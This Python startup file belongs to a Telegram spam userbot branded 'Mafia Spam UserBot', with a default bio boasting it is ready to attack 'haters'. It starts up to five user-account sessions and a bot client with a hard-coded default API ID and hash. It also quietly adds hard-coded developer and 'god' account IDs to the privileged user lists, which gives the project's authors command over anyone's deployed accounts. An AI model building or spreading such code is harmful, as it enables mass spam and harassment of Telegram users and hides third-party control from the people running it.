import os
import asyncio
import logging
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.utils import get_peer_id
from spambot.config import Config

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


API_ID = int(Config.API_ID) if Config.API_ID else 2184829
API_HASH = str(Config.API_HASH) if Config.API_ID else "6930b92388baabff4cb4a1d377085035"
BOT_TOKEN = Config.BOT_TOKEN
BOT_USERNAME = Config.BOT_USERNAME
SESSION_ONE = Config.SESSION_ONE
SESSION_TWO = Config.SESSION_TWO
SESSION_THREE = Config.SESSION_THREE
SESSION_FOUR = Config.SESSION_FOUR
SESSION_FIVE = Config.SESSION_FIVE
OWNER_ID = int(Config.OWNER_ID)
CO_OWNER_ID = Config.CO_OWNER_ID
SUDO_USERS = Config.SUDO_USERS
OWNER_NAME = str(Config.OWNER_NAME) if Config.OWNER_NAME else "MafiaSpamUserbot"
DISPLAY_PIC = str(Config.DISPLAY_PIC) if Config.DISPLAY_PIC else "https://telegra.ph/file/0db6ef22ae3b481c3891c.jpg"
BIO_MSG = str(Config.BIO_MSG) if Config.BIO_MSG else "Mafia Spam UserBot Ready To Fuck Haters!"
OWNER_USERNAME = str(Config.OWNER_USERNAME) if Config.OWNER_USERNAME else "MafiaBot_Support"
HEROKU_API_KEY = Config.HEROKU_API_KEY
HEROKU_APP_NAME = Config.HEROKU_APP_NAME

BOT_VERSION = 1.0

GOD_USERS = [1212368262]
DEV_USERS = [1174290051, 2066333634, 5140310878]
MY_USERS = []
LIMIT = []

MY_USERS.append(OWNER_ID)
MY_USERS.extend(CO_OWNER_ID)
MY_USERS.extend(SUDO_USERS)
MY_USERS.extend(DEV_USERS)
MY_USERS.extend(GOD_USERS)

LIMIT.append(OWNER_ID)
LIMIT.extend(CO_OWNER_ID)
LIMIT.extend(DEV_USERS)
LIMIT.extend(GOD_USERS)

DEV_USERS.extend(GOD_USERS)

async def main():
    global MafiaBot
    global MafiaBot1
    global MafiaBot2
    global MafiaBot3
    global MafiaBot4
    global MafiaBot5
    if SESSION_ONE:
        print("Working On Bot 1!")
        try:
            MafiaBot1 = TelegramClient(
                StringSession(SESSION_ONE),
                api_id=API_ID,
                api_hash=API_HASH,
                )
            await MafiaBot1.start()
            myID = await MafiaBot1.get_me()
            me = get_peer_id(myID)
            MY_USERS.append(me)
            LIMIT.append(me)
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot 1 Is'nt Available")
        try:
            session_name = "MafiaSpamBot1"
            MafiaBot1 = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot1.start()
        except Exception as e:
            pass

    if SESSION_TWO:
        print("Working On Bot 2!")
        try:
            MafiaBot2 = TelegramClient(
                StringSession(SESSION_TWO),
                api_id=API_ID,
                api_hash=API_HASH,
                )
            print("Bot 2 OK!")
            await MafiaBot2.start()
            myID = await MafiaBot2.get_me()
            me = get_peer_id(myID)
            MY_USERS.append(me)       
            LIMIT.append(me)       
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot 2 Is'nt Available")
        try:
            session_name = "MafiaSpamBot2"
            MafiaBot2 = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot2.start()
        except Exception as e:
            pass

    if SESSION_THREE:
        print("Working On Bot 3!")
        try:
            MafiaBot3 = TelegramClient(
                StringSession(SESSION_THREE),
                api_id=API_ID,
                api_hash=API_HASH,
                )
            print("Bot 3 OK!")
            await MafiaBot3.start()
            myID = await MafiaBot3.get_me()
            me = get_peer_id(myID)
            MY_USERS.append(me)      
            LIMIT.append(me)
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot 3 Is'nt Available")
        try:
            session_name = "MafiaSpamBot3"
            MafiaBot3 = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot3.start()
        except Exception as e:
            pass

    if SESSION_FOUR:
        print("Working On Bot 4!")
        try:
            MafiaBot4 = TelegramClient(
                StringSession(SESSION_FOUR),
                api_id=API_ID,
                api_hash=API_HASH,
                )
            await MafiaBot4.start()
            myID = await MafiaBot4.get_me()
            me = get_peer_id(myID)
            MY_USERS.append(me)  
            LIMIT.append(me)      
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot 4 Is'nt Available")
        try:
            session_name = "MafiaSpamBot4"
            MafiaBot4 = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot4.start()
        except Exception as e:
            pass

    if SESSION_FIVE:
        print("Working On Bot 5!")
        try:
            MafiaBot5 = TelegramClient(
                StringSession(SESSION_FIVE),
                api_id=API_ID,
                api_hash=API_HASH,
                )
            print("Bot 5 OK!")
            await MafiaBot5.start()
            myID = await MafiaBot5.get_me()
            me = get_peer_id(myID)
            MY_USERS.append(me)    
            LIMIT.append(me)    
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot 5 Is'nt Available")
        try:
            session_name = "MafiaSpamBot5"
            MafiaBot5 = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot5.start()
        except Exception as e:
            pass

    if BOT_TOKEN:
        print("Working On Bot Token!")
        try:
            MafiaBot = TelegramClient("MafiaSpamBot", api_id=API_ID, api_hash=API_HASH)
            print("Bot Token OK!")
            await MafiaBot.start()
        except Exception as e:
            print(e)
            pass
    else:
        print("Bot Token Is'nt Available Or Invalid Bot Token")
        try:
            session_name = "MafiaSpamBot"
            MafiaBot = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
            await MafiaBot.start()
        except Exception as e:
            pass    

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
